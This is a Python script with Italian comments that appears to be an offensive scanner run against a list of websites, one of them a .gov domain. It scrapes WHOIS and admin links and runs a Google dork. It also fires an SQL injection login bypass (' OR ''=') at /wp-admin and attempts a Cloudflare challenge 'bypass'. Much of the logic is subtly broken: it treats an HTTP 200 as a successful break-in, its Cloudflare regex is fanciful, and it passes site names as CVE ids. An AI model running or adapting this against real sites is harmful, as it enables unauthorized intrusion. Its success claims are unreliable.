import requests
from bs4 import BeautifulSoup
import re
import socket

# Funzione per estrarre l'IP da un indirizzo hostname
def get_ip(hostname):
    try:
        # Convertire il nome di dominio in IP usando la funzione gethostbyname del modulo socket
        ip = socket.gethostbyname(hostname)
        return ip
    except Exception as e:
        print(f"Errore: {e}")
        return None

# Funzione per eseguire lo scanner Whois su un sito web
def whois_scan(site):
    url = f"https://www.whois.com/whois/{site}"
    response = requests.get(url)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        result = soup.find("span", attrs={"class": "result-content"})
        if result is not None:
            print(result.text.strip())
    else:
        print(f"Errore: non è stato possibile scaricare i risultati Whois per {site}")

# Funzione per cercare la pagina admin su un sito web
def find_admin_page(site):
    url = f"http://{site}"
    response = requests.get(url)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        links = [link["href"] for link in soup.find_all("a", href=True)]
        admin_links = [link for link in links if "admin" in link.lower()]
        if admin_links:
            print(f"Pagina amministrativa trovata: {admin_links}")
    else:
        print(f"Errore: non è stato possibile cercare la pagina amministrativa per {site}")

# Funzione per eseguire lo scanner SQL su un sito web
def sql_scan(site):
    url = f"http://{site}/wp-admin"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
    params = {"pageno": 1, "pagewanted": "all", "_xfRequestUri": "/wp-admin", "_xfNoJs": True}
    response = requests.get(url, headers=headers, params=params)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        form_action = soup.find("form", attrs={"id": "login-form"})
        login_url = form_action["action"]
        payload = {"log": "admin", "pwd": "' OR ''='"}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Content-Type": "application/x-www-form-urlencoded"}
        response = requests.post(login_url, data=payload, headers=headers)
        if response.status_code == 200:
            print("Accesso riuscito con SQL Injection!")
        else:
            print(f"Errore: non è stato possibile eseguire l'iniezione SQL per {site}")
    else:
        print(f"Errore: non è stato possibile cercare la pagina di accesso amministrativo per {site}")

# Funzione per cercare Dorks su Google
def google_dork(site):
    url = f"https://www.google.com/search?q=site:{site}+inurl:admin"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        result_divs = soup.find_all("div", attrs={"class": "rc"})
        for result in result_divs:
            links = [link["href"] for link in result.find_all("a", href=True)]
            print(f"Link trovato: {links}")
    else:
        print(f"Errore: non è stato possibile cercare Dorks su Google per {site}")

# Funzione per bypassare Cloudflare
def bypass_cloudflare(site):
    url = f"https://{site}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
    response = requests.get(url, headers=headers)
    if response.status_code == 503:
        soup = BeautifulSoup(response.text, 'html.parser')
        cf_challenge_token = re.search(r"var cf_challenge_token = '(.*?)';", str(soup)).group(1)
        cf_fqdn = re.search(r"window.location.href = 'https://.+?';", str(soup)).group(0).replace("window.location.href =", "").strip().rstrip(";")
        payload = {"pass": cf_challenge_token}
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Referer": f"https://{cf_fqdn}"}
        response = requests.post(url, data=payload, headers=headers)
        if response.status_code == 200:
            print("Cloudflare bypassed!")
        else:
            print(f"Errore: non è stato possibile bypassare Cloudflare per {site}")
    else:
        print(f"Errore: non è stato possibile cercare la pagina amministrativa per {site}")

# Funzione per cercare vulnerability CVE
def cve_scan(site):
    url = f"https://cve.mitre.org/cgi-bin/cvename?name={site}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        cve_info = soup.find("td", attrs={"headers": "summary"})
        if cve_info is not None:
            print(f"Vulnerabilità CVE trovata: {cve_info.text.strip()}")
    else:
        print(f"Errore: non è stato possibile cercare la vulnerabilità CVE per {site}")

# Funzione principale per eseguire lo scanner su un sito web
def scan_site(site):
    whois_scan(site)
    find_admin_page(site)
    sql_scan(site)
    google_dork(site)
    bypass_cloudflare(site)
    cve_scan(site)

# Elenca i siti web da analizzare
sites = [
    "sito.com",
    "www.sito.net",
    "site.gov",
    "example.org"
]

# Scansiona ogni sito nella lista
for site in sites:
    print(f"\nScansione del sito {site}...")
    ip = get_ip(site)
    if ip is not None:
        print(f"IP del sito: {ip}")
        scan_site(site)
    else:
        print(f"Errore: non è stato possibile trovare l'IP per {site}")

print("\nFine delle scansione.")